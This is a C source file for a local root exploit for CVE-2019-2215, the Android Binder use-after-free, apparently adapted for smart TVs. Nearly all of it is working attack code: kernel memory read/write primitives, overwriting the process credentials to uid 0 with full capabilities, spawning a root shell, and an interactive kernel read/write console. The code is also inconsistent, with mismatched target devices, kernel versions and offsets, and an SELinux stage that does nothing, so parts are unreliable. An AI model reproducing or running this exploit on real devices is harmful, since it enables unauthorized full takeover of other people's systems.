/*
 * poc-bravia.c: Temproot for Bravia TV via CVE-2019-2215
 * Written by updateing.
 * Based on kangtastic/cve-2019-2215.
 * https://github.com/kangtastic/cve-2019-2215.git
 */

#define _GNU_SOURCE
#include <ctype.h>
#include <err.h>
#include <errno.h>
#include <error.h>
#include <fcntl.h>
#include <linux/sched.h>
#include <sched.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/un.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

typedef uint8_t u8;
typedef uint32_t u32;
typedef uint64_t u64;

// #include <linux/android/binder.h>
#define BINDER_THREAD_EXIT 0x40046208ul

// #include <arch/arm64/include/asm/uaccess.h>
#define USER_DS 0x8000000000ul

// NOTE: we don't cover the task_struct* here; we want to leave it uninitialized
#ifndef PAGE_SIZE
#define PAGE_SIZE 0x1000
#endif

/* Data structure definitions as found in the Sep 2019 QP1A.190711.020 build of
 * Android 10 for walleye/taimen, kernel version-BuildID 4.4.177-g83bee1dc48e8.
 * Verified using `pahole` on a build of the official Android kernel/msm git:
 *
 *  https://android.googlesource.com/kernel/msm/+/refs/heads/android-msm-wahoo-4.4-android10
 *  (tree a4557a647a054b871bdf8e452a014cafa0ae5078)
 *
 * We leave only the fields in which we're interested, and we're really only
 * interested in their offsets; the others_* fields are padding.
 *
 *                            (<original type>           <offset> <size>)
 */
struct binder_thread {
    u8 others_0[152];
    u8 wait[24];           /*  wait_queue_head_t           152     24  */
    u8 others_1[224];
} __attribute__((packed)); /* size: 400 in kernel */

struct task_struct {
    u8 others_0[1160];
    u64 mm;                /*  struct mm_struct *          1160    8   */
    u8 others_1[592];
    u64 real_cred;         /*  const struct cred *         1760    8   */
    u64 cred;              /*  const struct cred *         1768    8   */
    u8 others_2[1688];
} __attribute__((packed)); /* size: 3464 */

struct mm_struct {
    u8 others_0[768];
    u64 user_ns;           /*  struct user_namespace *     768     8   */
    u8 others_1[48];
} __attribute__((packed)); /* size: 824 */

struct cred {
    u8 others_0[4];
    u32 uid;               /*  kuid_t                      4       4   */
    u32 gid;               /*  kgid_t                      8       4   */
    u32 suid;              /*  kuid_t                      12      4   */
    u32 sgid;              /*  kgid_t                      16      4   */
    u32 euid;              /*  kuid_t                      20      4   */
    u32 egid;              /*  kgid_t                      24      4   */
    u32 fsuid;             /*  kuid_t                      28      4   */
    u32 fsgid;             /*  kgid_t                      32      4   */
    u32 securebits;        /*  unsigned int                36      4   */
    u64 cap_inheritable;   /*  kernel_cap_t                40      8   */
    u64 cap_permitted;     /*  kernel_cap_t                48      8   */
    u64 cap_effective;     /*  kernel_cap_t                56      8   */
    u64 cap_bset;          /*  kernel_cap_t                64      8   */
    u64 cap_ambient;       /*  kernel_cap_t                72      8   */
    u64 security;          /*  void *                      80      8   */
    u8 others_2[40];
} __attribute__((packed)); /* size: 128 */

struct task_security_struct {
    u32 osid;              /*  u32                         0       4   */
    u32 sid;               /*  u32                         4       4   */
    u32 exec_sid;          /*  u32                         8       4   */
    u32 create_sid;        /*  u32                         12      4   */
    u32 keycreate_sid;     /*  u32                         16      4   */
    u32 sockcreate_sid;    /*  u32                         20      4   */
} __attribute__((packed)); /* size: 24 */

/* Kernel symbol table offsets, relative to _head, in the QP1A.190711.020
 * walleye/taimen kernel. The SELinux-related offsets were determined with
 * reference to System.map and a minor bit of trial-and-error.
 */
const ptrdiff_t ksym_init_task = 0xef5500;
const ptrdiff_t ksym_init_user_ns = 0xf02768;
const ptrdiff_t ksym_selinux_enabled = 0xf512b0;
const ptrdiff_t ksym_selinux_enforcing = 0x1018034;

/* The exploit relies upon a use-after-free by the kernel's epoll cleanup code
 * resulting from an oversight in Android's Binder IPC subsystem, fixed here:
 *
 *  https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b
 *
 * In the original Project Zero POC, arrays of 25 `struct iovec`s are treated
 * as `struct binder_thread`s by the kernel. We do the same here via a union,
 * which hopefully clarifies where the #defines of 25 and 10 came from in the
 * original POC. Since we're using structure definitions for offsets only, we're
 * fine cutting off 8 bytes from our definition of a `struct binder_thread` to
 * ensure `sizeof(binder_iovecs) == sizeof(struct iovec[25]) == 400`.
 */
const size_t iovs_sz = sizeof(struct binder_thread) / sizeof(struct iovec) - 1; /* Leave last one uninitialized */
const size_t iov_idx = offsetof(struct binder_thread, wait) / sizeof(struct iovec);
typedef union {
    struct binder_thread bt;
    struct iovec iovs[iovs_sz];
} binder_iovecs;

void kwrite(u64 kaddr, void *buf, size_t len);
void kread(u64 kaddr, void *buf, size_t len);
void kwrite_u64(u64 kaddr, u64 data);
void kwrite_u32(u64 kaddr, u32 data);
u64 kread_u64(u64 kaddr);
u64 kread_u32(u64 kaddr);

void prepare_globals(void);
void find_current(void);
void obtain_kernel_rw(void);
void find_kernel_base(void);
void patch_creds(void);
void launch_shell(void);
void launch_debug_console(void);

void con_loop(void);
int con_consume(char **token);
int con_parse_hexstring(char *token, u64 *val);
int con_parse_number(char *token, u64 *val);
int con_parse_hexbytes(char **token, u8 **data, size_t *len);
void con_kdump(u64 kaddr, size_t len);

void execute_stage(int op);
void notify_stage_failure(void);

int main(int argc, char *argv[]);

pid_t pid;
int debugging;
void *dummy_page;
int kernel_rw_pipe[2];
int is_subprocess;
int dumping;
int cred_off;

u64 current;
u64 kernel_base;
u64 thread_info;
u64 addr_limit_addr;

void initial_kernel_write(u64 addr, const void *data, size_t len) {
    int l_binder_fd = open("/dev/binder", O_RDONLY);
    int l_epoll_fd = epoll_create(1000);

    /* Basically same as clobber_addr_limit() */
    struct epoll_event event = {.events = EPOLLIN};
    if (epoll_ctl(l_epoll_fd, EPOLL_CTL_ADD, l_binder_fd, &event))
        err(1, "epoll_add");

    binder_iovecs bio;
    memset(&bio, 0, sizeof(bio));
    bio.iovs[iov_idx].iov_base = dummy_page;
    bio.iovs[iov_idx].iov_len = 0x10001;                 /* spinlock-like number, must block recvmsg for the child */
    bio.iovs[iov_idx + 1].iov_base = (void *)0xdeadbeef; /* wq->task_list->next */
    bio.iovs[iov_idx + 1].iov_len = 2 * 0x10 + 1;        /* wq->task_list->prev */
    bio.iovs[iov_idx + 2].iov_base = (void *)0xbeefdead; /* will be overwritten */
    bio.iovs[iov_idx + 2].iov_len = len;                 /* should be correct from the start, kernel will sum up lengths when importing */

    struct iovec overwritten_iovs[2] = { /* Will be overwritten from &bio.iovs[iov_idx + 1] */
        {
            .iov_base = dummy_page,
            .iov_len = 2 * 0x10 + 1, /* +1 for triggering iov_iter advancing */
        },
        {
            .iov_base = (void *)addr,
            .iov_len = len,
        }
    };

    int socks[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks))
        err(1, "socketpair");
    if (write(socks[1], dummy_page, 0x10001) != 0x10001)
        err(1, "write spinlock-like dummy bytes");

    pid = fork();
    if (pid == -1)
        err(1, "fork");
    if (pid == 0) {
        /* Child process */
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        sleep(1);
        epoll_ctl(l_epoll_fd, EPOLL_CTL_DEL, l_binder_fd, &event);

        if (write(socks[1], overwritten_iovs, sizeof(overwritten_iovs)) != 2 * 0x10)
            err(1, "overwrite iovecs");
        if (write(socks[1], "X", 1) != 1) // has to be a separate write to take advantage of iov_len just written
            err(1, "advance iov_iter");
        if (write(socks[1], data, len) != len)
            err(1, "write actual data");
        exit(0);
    }

    ioctl(l_binder_fd, BINDER_THREAD_EXIT, NULL);
    struct msghdr msg = {.msg_iov = bio.iovs, .msg_iovlen = iovs_sz};
    size_t recvmsg_sz = bio.iovs[iov_idx].iov_len +
                        bio.iovs[iov_idx + 1].iov_len +
                        bio.iovs[iov_idx + 2].iov_len;
    ssize_t recvmsg_ret = recvmsg(socks[0], &msg, MSG_WAITALL);
    if (recvmsg_ret != (ssize_t)recvmsg_sz)
        err(1, "recvmsg() returns %ld, expected %lu\n", recvmsg_ret, recvmsg_sz);

    close(socks[0]);
    close(socks[1]);
    close(l_binder_fd);
    close(l_epoll_fd);

    pid_t status;
    if (wait(&status) != pid)
        err(1, "write wait");
}

/**
 * If addr == 0, no `inital_kernel_write` will be called, and data will come from
 * pointers set by UAF. Otherwise read data from given address.
 */
void initial_kernel_read(u64 addr, const void *data, size_t len) {
    /* Basically same as leak_task_struct() with an optinal call to initial_kernel_write() */
    int l_binder_fd = open("/dev/binder", O_RDONLY);
    int l_epoll_fd = epoll_create(1000);

    struct epoll_event event = {.events = EPOLLIN};
    if (epoll_ctl(l_epoll_fd, EPOLL_CTL_ADD, l_binder_fd, &event))
        err(1, "epoll_add");

    binder_iovecs bio;
    memset(&bio, 0, sizeof(bio));

    struct iovec overwritten_iovs[1] = { /* Will be overwritten from &bio.iovs[iov_idx + 1] */
        {
            .iov_base = (void *)(addr - PAGE_SIZE + 2), /* We would have been read a page (offset = PAGE_SIZE) when this is written */
            .iov_len = PAGE_SIZE - 2 + len, /* No `0x10001 +` is needed - this is required for writev summing up lengths */
        }
    };

    size_t iov_len_sum = 0;
    bio.iovs[iov_idx].iov_base = dummy_page;
    bio.iovs[iov_idx].iov_len = 0x10001;                 /* spinlock-like number, must block recvmsg for the child. Note it will become 0x20002 after UAF */
    bio.iovs[iov_idx + 1].iov_base = (void *)0xdeadbeef; /* wq->task_list->next */
    bio.iovs[iov_idx + 1].iov_len = 0x10001 + (addr ? (PAGE_SIZE - 2) : 0) + len; /* wq->task_list->prev. Note that kernel will sum up lengths before copying, must be correct. */
    /* Read data will be composed of 0x20002 of dummy_page, [(PAGE_SIZE - 2) from binder_thread, ]and `len` bytes of actual data */
    iov_len_sum = bio.iovs[iov_idx].iov_len + bio.iovs[iov_idx + 1].iov_len;

    int exploit_pipe[2];
    int business_pipe[2];
    if (pipe(exploit_pipe))
        err(1, "exploit pipe");
    if (pipe(business_pipe))
        err(1, "business pipe");
    if (fcntl(exploit_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) != PAGE_SIZE)
        err(1, "pipe size");

    pid = fork();
    if (pid == -1)
        err(1, "fork");
    if (pid == 0) {
        /* Child process */
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        sleep(1);
        epoll_ctl(l_epoll_fd, EPOLL_CTL_DEL, l_binder_fd, &event);

        // first 0x20002 bytes: dummy data
        printf("Child read begin...\n");
        if (read(exploit_pipe[0], dummy_page, 0x20002) != 0x20002)
            err(1, "read initial dummy data");

        // inject target read address into our iovs
        if (addr != 0) {
            if (read(exploit_pipe[0], dummy_page, PAGE_SIZE - 3) != PAGE_SIZE - 3)
                err(1, "read wq address");
            if (*(u64 *)dummy_page == 0)
                errx(1, "wq address is zero");
            initial_kernel_write(*(u64 *)dummy_page, overwritten_iovs, sizeof(overwritten_iovs));
            if (read(exploit_pipe[0], dummy_page, 1) != 1)
                err(1, "advance iovec");
        }

        // read wanted data
        if (read(exploit_pipe[0], dummy_page, len) != len)
            err(1, "read full pipe");

        printf("Child read done\n");

        write(business_pipe[1], dummy_page, len);
        exit(0);
    }

    ioctl(l_binder_fd, BINDER_THREAD_EXIT, NULL);
    printf("Parent write begin...\n");
    ssize_t writev_ret = writev(exploit_pipe[1], bio.iovs, iovs_sz);
    printf("Parent write done\n");
    if (writev_ret != iov_len_sum)
        fprintf(stderr, "[!] writev short 0x%lx vs 0x%lx (continue anyway)\n",
                writev_ret, iov_len_sum);
    if (read(business_pipe[0], data, len) != len)
        err(1, "read full business pipe");

    close(business_pipe[0]);
    close(business_pipe[1]);
    close(exploit_pipe[0]);
    close(exploit_pipe[1]);
    close(l_binder_fd);
    close(l_epoll_fd);

    pid_t status;
    if (wait(&status) != pid)
        err(1, "read wait");
}

#define RW_CHUNK 3464

void kread(u64 kaddr, void *buf, size_t len) {
    if (len == 0) return;
    u8 *tmp = (u8 *)malloc(RW_CHUNK);
    u64 page = kaddr & ~(u64)0xfff;
    size_t off = (size_t)(kaddr - page);
    if (off + len <= RW_CHUNK) {
        initial_kernel_read(page, tmp, RW_CHUNK);
        memcpy(buf, tmp + off, len);
        free(tmp);
        return;
    }
    initial_kernel_read(page, tmp, RW_CHUNK);
    size_t first = RW_CHUNK - off;
    if (first > len) first = len;
    memcpy(buf, tmp + off, first);
    initial_kernel_read(page + 0x1000, tmp, RW_CHUNK);
    memcpy((u8 *)buf + first, tmp, len - first);
    free(tmp);
}
u64 kread_u64(u64 kaddr) { u64 d = 0; kread(kaddr, &d, 8); return d; }
u64 kread_u32(u64 kaddr) { u32 d = 0; kread(kaddr, &d, 4); return d; }
void kwrite(u64 kaddr, void *buf, size_t len) {
    u8 *in = (u8 *)buf;
    size_t off = 0;
    while (off < len) {
        size_t n = len - off > 8 ? 8 : len - off;
        initial_kernel_write(kaddr + off, in + off, n);
        off += n;
    }
}
void kwrite_u64(u64 kaddr, u64 d) { kwrite(kaddr, &d, sizeof(d)); }
void kwrite_u32(u64 kaddr, u32 d) { kwrite(kaddr, &d, sizeof(d)); }

void prepare_globals(void) {
    pid = getpid();

    struct utsname kernel_info;
    if (uname(&kernel_info) == -1)
        err(1, "determine kernel release");
    if (strcmp(kernel_info.release, "4.9.44"))
        warnx("kernel version-BuildID is not '4.9.44'");

    dummy_page = mmap((void *)0x100000000ul, 0x30000,
                      PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (dummy_page != (void *)0x100000000ul)
        err(1, "mmap 4g aligned");
    if (pipe(kernel_rw_pipe))
        err(1, "kernel_rw_pipe");
}
void find_current(void) {
    static char page_buffer[PAGE_SIZE];
    initial_kernel_read(0, page_buffer, PAGE_SIZE);
    current = *(u64 *)(page_buffer + 0xe8); // 0xe8 = offsetof(task) - offsetof(wait->tasklist)
    printf("current task_struct is at 0x%llx\n", current);
}
void find_thread_info(void) {
    u64 *task_struct = malloc(sizeof(struct task_struct));
    initial_kernel_read(current, task_struct, sizeof(struct task_struct));

    u64 *kernel_stack = malloc(0x10000);
    u64 kernel_stack_addr = *(task_struct + 1);
    initial_kernel_read(kernel_stack_addr, kernel_stack, 0x10000);

    addr_limit_addr = 0;
    for (int i = 0; i < 8; i++) {
        if (kernel_stack[i] == USER_DS) {
            addr_limit_addr = kernel_stack_addr + 8 * i;
            printf("[*] addr_limit at 0x%llx\n", addr_limit_addr);
            return;
        }
    }
    errx(1, "find addr_limit");
}
void obtain_kernel_rw(void) {
    u64 v = 0xFFFFFFFFFFFFFFFEul;
    initial_kernel_write(addr_limit_addr, &v, 8);
    u64 chk = 0;
    initial_kernel_read(addr_limit_addr, &chk, 8);
    printf("[*] addr_limit now 0x%llx\n", chk);
    u64 back = USER_DS;
    initial_kernel_write(addr_limit_addr, &back, 8);
}
void find_kernel_base(void) {
    u64 current_mm = kread_u64(current + offsetof(struct task_struct, mm));
    u64 current_user_ns = kread_u64(current_mm + offsetof(struct mm_struct, user_ns));
    kernel_base = current_user_ns - ksym_init_user_ns;
    if (kernel_base & 0xffful) {
        if (debugging) {
            warnx("bad kernel base (not 0x...000)");
            kernel_base = 0;
            return;
        } else {
            errx(1, "bad kernel base (not 0x...000)");
        }
    }

    u64 init_task = kernel_base + ksym_init_task;
    u64 cred_ptrs[2] = {
        kread_u64(init_task + offsetof(struct task_struct, real_cred)), /* init_task.real_cred */
        kread_u64(init_task + offsetof(struct task_struct, cred)),      /* init_task.cred */
    };

    /* Examine what we think are the init process' credentials.
     * Presumably, these tests are unlikely to pass unless we have the right
     * kernel base, kernel symbol offsets, and kernel data structure offsets.
     */
    for (int cred_idx = 0; cred_idx < 2; cred_idx++) {
        struct cred cred;
        kread(cred_ptrs[cred_idx], &cred, sizeof(struct cred));

        if (cred.uid || cred.gid || cred.suid || cred.sgid ||
            cred.euid || cred.egid || cred.fsuid || cred.fsgid) {
            if (debugging) {
                warnx("bad kernel base (init_task not where expected)");
                kernel_base = 0;
                return;
            } else {
                errx(1, "bad kernel base (init_task not where expected)");
            }
        }

        const u64 cap = 0x3fffffffff;
        if (cred.cap_inheritable || cred.cap_permitted != cap ||
            cred.cap_effective != cap || cred.cap_bset != cap ||
            cred.cap_ambient) {
            if (debugging) {
                warnx("bad kernel base (init_task not where expected)");
                kernel_base = 0;
                return;
            } else {
                errx(1, "bad kernel base (init_task not where expected)");
            }
        }

        /* .real_cred == .cred, probably. */
        if (cred_ptrs[0] == cred_ptrs[1])
            break;
    }
}
static int looks_like_kernel_ptr(u64 v) {
    return v >= 0xffffff8000000000ul && v <= 0xfffffffffffffffful;
}

void dump_task(void) {
    u8 *b = malloc(sizeof(struct task_struct));
    initial_kernel_read(current, b, sizeof(struct task_struct));
    for (int i = 0; i < (int)sizeof(struct task_struct); i += 16) {
        printf("%04x:", i);
        for (int j = 0; j < 16 && i + j < (int)sizeof(struct task_struct); j++)
            printf(" %02x", b[i + j]);
        printf("\n");
    }
}

void patch_creds(void) {
    u8 *b = malloc(sizeof(struct task_struct));
    initial_kernel_read(current, b, sizeof(struct task_struct));

    if (cred_off == 0) {
        int found = 0;
        for (int off = 8; off < (int)sizeof(struct task_struct) - 16; off += 8) {
            u64 p1 = *(u64 *)(b + off);
            u64 p2 = *(u64 *)(b + off + 8);
            if (p1 != p2 || !looks_like_kernel_ptr(p1)) continue;
            u32 uid = 0;
            initial_kernel_read(p1 + 4, &uid, 4);
            if (uid == (u32)getuid()) {
                printf("[*] cred at task+0x%x -> 0x%llx\n", off, p1);
                cred_off = off;
                found = 1;
                break;
            }
        }
        if (!found) errx(1, "cred offset not found");
    }

    u64 cred_ptr = *(u64 *)(b + cred_off);
    if (!looks_like_kernel_ptr(cred_ptr)) errx(1, "bad cred ptr");

    struct cred *cr = malloc(sizeof(struct cred));
    initial_kernel_read(cred_ptr, cr, sizeof(struct cred));
    printf("[*] old uid=%u gid=%u euid=%u caps=%llx\n",
           cr->uid, cr->gid, cr->euid, cr->cap_permitted);

    cr->uid = 0; cr->gid = 0; cr->suid = 0; cr->sgid = 0;
    cr->euid = 0; cr->egid = 0; cr->fsuid = 0; cr->fsgid = 0;
    cr->securebits = 0;
    cr->cap_inheritable = ~(u64)0;
    cr->cap_permitted = ~(u64)0;
    cr->cap_effective = ~(u64)0;
    cr->cap_bset = ~(u64)0;
    cr->cap_ambient = ~(u64)0;
    initial_kernel_write(cred_ptr, cr, sizeof(struct cred));

    if (getuid()) errx(1, "patched but uid is not 0");
    printf("[+] ROOT ACQUIRED, uid=%d\n", getuid());
}
void launch_shell(void) {
    if (execl("/system/bin/sh", "/system/bin/sh", (char *)NULL) == -1)
        err(1, "launch shell");
}
void launch_debug_console(void) {
    printf("launching debug console; enter 'help' for quick help\n");
    con_loop();
}

void con_loop(void) {
    u64 kaddr;
    size_t len;

    int running = 1;
    while (running) {
        printf("debug> ");

        char *line = NULL;
        size_t getline_buf_len = 0;
        if (getline(&line, &getline_buf_len, stdin) == -1)
            err(1, "read stdin");
        int was_handled = 0;

        char *token = strtok(line, " \t\r\n\a");
        if (token && !strcmp(token, "print") && con_consume(&token)) {
            printf("%lx kernel_base\n", kernel_base);
            printf("%lx init_task\n", kernel_base + ksym_init_task);
            printf("%lx init_user_ns\n", kernel_base + ksym_init_user_ns);
            printf("%lx selinux_enabled\n", kernel_base + ksym_selinux_enabled);
            printf("%lx selinux_enforcing\n", kernel_base + ksym_selinux_enforcing);
            printf("%lx current\n", current);
            was_handled = 1;
        } else if (token && !strcmp(token, "read")) {
            /* Not that there'd actually be any kmem allocated there, but if the
             * read address were 0xffffffffffffffff, we'd technically be able to
             * read exactly one byte. We ~do~ want to handle that case... right?
             */
            if (con_parse_hexstring(strtok(NULL, " \t\r\n\a"), &kaddr) &&
                con_parse_number(strtok(NULL, " \t\r\n\a"), &len) &&
                con_consume(&token) && 0 < len && len <= PAGE_SIZE &&
                len - 1 <= ~(u64)0 - kaddr) {
                con_kdump(kaddr, len);
                was_handled = 1;
            }
        } else if (token && !strcmp(token, "write")) {
            u8 *data = NULL;
            if (con_parse_hexstring(strtok(NULL, " \t\r\n\a"), &kaddr) &&
                con_parse_hexbytes(&token, &data, &len) && 0 < len &&
                len <= PAGE_SIZE && len - 1 <= ~(u64)0 - kaddr) {
                kwrite(kaddr, data, len);
                was_handled = 1;
            }
            free(data);
        } else if (token && !strcmp(token, "shell") && con_consume(&token)) {
            pid = fork();
            if (pid == -1)
                err(1, "fork");
            if (pid == 0)
                launch_shell();
            pid_t status;
            do {
                waitpid(pid, &status, WUNTRACED);
            } while (!WIFEXITED(status) && !WIFSIGNALED(status));
            was_handled = 1;
        } else if (token && !strcmp(token, "help") && con_consume(&token)) {
            printf(
                "quick help\n"
                "    print\n"
                "        print kernel base address, some kernel symbol offsets,\n"
                "        and address of current task_struct as hexstrings\n"
                "    read <kaddr> <len>\n"
                "        read <len> bytes from <kaddr> and display as a hexdump\n"
                "        <kaddr> is a hexstring not prefixed with 0x\n"
                "        <len> is 1-4096 or 0x1-0x1000\n"
                "    write <kaddr> <data>\n"
                "        write <data> to <kaddr>\n"
                "        <kaddr> is a hexstring not prefixed with 0x\n"
                "        <data> is 1-4096 hexbytes, spaces ignored, to be written *AS-IS*\n"
                "        e.g. if kaddr 0xffffffffdeadbeef contains an int, and you want to set\n"
                "        its value to 1, enter 'write ffffffffdeadbeef <data>', where <data> is\n"
                "        '01000000', '0100 0000', '01 00 0 0 00', etc. (our ARM is little-endian)\n"
                "    shell\n"
                "        launch a shell (hint: have we ~somehow~ become another user? :P)\n"
                "    help\n"
                "        print this help\n"
                "    exit\n"
                "        exit debug console\n");
            was_handled = 1;
        } else if (token && !strcmp(token, "exit") && con_consume(&token)) {
            running = 0;
            was_handled = 1;
        }

        if (!was_handled)
            printf("woopz; enter 'help' for quick help\n");

        free(line);
    }
}
int con_consume(char **token) {
    int ret = 1;
    do {
        if ((*token = strtok(NULL, " \t\r\n\a")))
            ret = 0;
    } while (*token);
    return ret;
}
int con_parse_hexstring(char *token, u64 *val) {
    if (!token || !(*token))
        return 0;
    *val = 0;
    while (*token) {
        if (*val & 0xf000000000000000)
            return 0;
        else if ('0' <= *token && *token <= '9')
            *val = *val * 16 + *token - '0';
        else if ('a' <= *token && *token <= 'f')
            *val = *val * 16 + *token - 'a' + 10;
        else if ('A' <= *token && *token <= 'F')
            *val = *val * 16 + *token - 'A' + 10;
        else
            return 0;
        token++;
    }
    return 1;
}
int con_parse_number(char *token, u64 *val) {
    if (!token || !(*token))
        return 0;
    if (*token == '0' && (token[1] == 'x' || token[1] == 'X'))
        return con_parse_hexstring(token + 2, val);
    *val = 0;
    while (*token) {
        if (*token < '0' || '9' < *token)
            return 0;
        *val = *val * 10 + *token - '0';
        if (*val > PAGE_SIZE)
            return 0;
        token++;
    }
    return 1;
}
int con_parse_hexbytes(char **token, u8 **data, size_t *len) {
    static char hexbyte[2 + 1] = {'\0'};

    u8 *buf = malloc(PAGE_SIZE * sizeof(u8));
    if (!buf)
        err(1, "allocate memory");

    *data = buf;
    *len = 0;
    int hexbyte_idx = 0;

    while ((*token = strtok(NULL, " \t\r\n\a"))) {
        for (char *c = *token; *c; c++) {
            if (!isxdigit(*c))
                return 0;
            hexbyte[hexbyte_idx++] = *c;
            if (hexbyte_idx == 2) {
                hexbyte_idx = 0;
                u64 val;
                if (*len == PAGE_SIZE || !con_parse_hexstring(hexbyte, &val))
                    return 0;
                buf[(*len)++] = (u8)(val & 0xff);
            }
        }
    }

    return *len && !hexbyte_idx;
}
void con_kdump(u64 kaddr, size_t len) {
    /* Mimic the output of `xxd`. */
    static char line[40 + 1] = {'\0'};
    static char text[16 + 1] = {'\0'};

    if (!len)
        return;

    u8 *buf = malloc(len * sizeof(u8));
    if (!buf)
        err(1, "allocate memory");

    kread(kaddr, buf, len);

    for (u64 line_offset = 0; line_offset < len; line_offset += 16) {
        char *linep = line;
        for (size_t i = 0; i < 16; i++) {
            if (i + line_offset < len) {
                char c = buf[i + line_offset];
                linep += sprintf(linep, (i & 1) ? "%02x " : "%02x", c);
                text[i] = (' ' <= c && c <= '~') ? c : '.';
            } else {
                linep += sprintf(linep, (i & 1) ? "   " : "  ");
                text[i] = ' ';
            }
        }
        printf("%016lx: %s %s\n", kaddr + line_offset, line, text);
    }

    free(buf);
}

/* Excuse this mess; bionic libc doesn't have on_exit(). */
char *stage_desc;
struct stage_t {
    void (*func)(void);
    char *desc;
};
struct stage_t stages[] = {
    {prepare_globals, "startup"},
    {find_current, "find kernel address of current task_struct"},
    {find_thread_info, "find thread_info structure"},
    {obtain_kernel_rw, "obtain arbitrary kernel memory R/W"},
    {patch_creds, "bypass SELinux and patch current credentials"},
    {launch_shell, NULL},
    {launch_debug_console, NULL},
};
void execute_stage(int stage_idx) {
    stage_desc = stages[stage_idx].desc;
    (*stages[stage_idx].func)();
    if (stage_desc && pid && (stage_idx != 4 || kernel_base))
        printf("[+] %s\n", stage_desc);
}
void notify_stage_failure(void) {
    if (stage_desc && pid)
        fprintf(stderr, "[-] %s failed\n", stage_desc);
}

static void run_stages(void) {
    execute_stage(0);
    execute_stage(1);
    if (dumping) { dump_task(); return; }
    if (debugging) {
        execute_stage(2);
        execute_stage(3);
        execute_stage(6);
    } else {
        execute_stage(4);
        execute_stage(5);
    }
}

int main(int argc, char *argv[]) {
    debugging = argc == 2 && !strcmp(argv[1], "debug");
    dumping = argc == 2 && !strcmp(argv[1], "dump");
    is_subprocess = 0;
    cred_off = 0;
    if (argc == 3 && !strcmp(argv[1], "credoff")) cred_off = atoi(argv[2]);
    printf("CVE-2019-2215 root for Skyworth 9S60 / kernel 4.9.44\n");

    for (int attempt = 0; attempt < 12; attempt++) {
        pid_t p = fork();
        if (p == 0) {
            run_stages();
            _exit(0);
        }
        int st = 0;
        if (waitpid(p, &st, 0) != p) err(1, "waitpid");
        if (WIFEXITED(st) && WEXITSTATUS(st) == 0) { stage_desc = NULL; return 0; }
        usleep(300000);
    }
    fprintf(stderr, "[-] all attempts failed\n");
    return 1;
}
